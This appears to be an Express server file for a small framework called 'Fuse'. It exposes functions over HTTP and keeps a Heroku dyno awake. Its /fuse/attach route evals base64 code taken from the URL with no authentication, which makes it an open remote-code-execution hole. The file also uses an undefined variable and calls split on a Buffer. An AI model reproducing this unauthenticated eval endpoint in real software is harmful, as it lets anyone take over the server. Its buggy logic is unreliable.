const { wakeDyno, wakeDynos } = require('heroku-keep-awake');
const express = require('express');
const fs = require("fs");

const app = express();
app.use(express.static(__dirname));

function FUSE_FN(fn){
	var fne;
	app.get("/fuse/run/" + fn.name, async (req, res) => {
		if (req.query.args) {
			var args = atob(req.query.args).split(",");
      if (fn.constructor.name == "AsyncFunction") {
			  res.send(await fn(...args))
      } else {
        res.send(fn(...args))
      }
		} else {
			if (fn.constructor.name == "AsyncFunction") {
			  res.send(await fn(...args))
      } else {
        res.send(fn(...args))
      }
		}
	})
  }

function rangethrough(sequence, str) {
    var a2 = [];
    str.split(sequence[0]).forEach(function(e) {
        var h = e.split(sequence[1]);
        if (h.length == 1) {
            h = h[0];
        }
        a2.push(h)
    })
    var a3 = [];
    a2.forEach(function(e) {
        var type = typeof e;
        if (type == "object") {
            a3.push(sequence[0] + e[0] + sequence[1]);
            a3.push(e[1]);
        } else {
            a3.push(e);
        }
    })
    return a3;
}

if (fs.existsSync("preload.json")) {
  var preload = JSON.parse(fs.readFileSync("preload.json").toString());
  preload.files.forEach(function(file){
    eval(fs.readFileSync(file).toString())
  })
}
app.get('/fuse/attach/:code', (req, res) => {
  eval(atob(req.params.code))
  res.send("attached")
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Fuse server started');
  setInterval(function(){
	var data = rangethrough(["/*","*/"], fs.readFileSync('functions.js'))[1].split("\n")[1].split(" = ")[1];
  	wakeDyno("https://"+data);
  }, 600000)
});
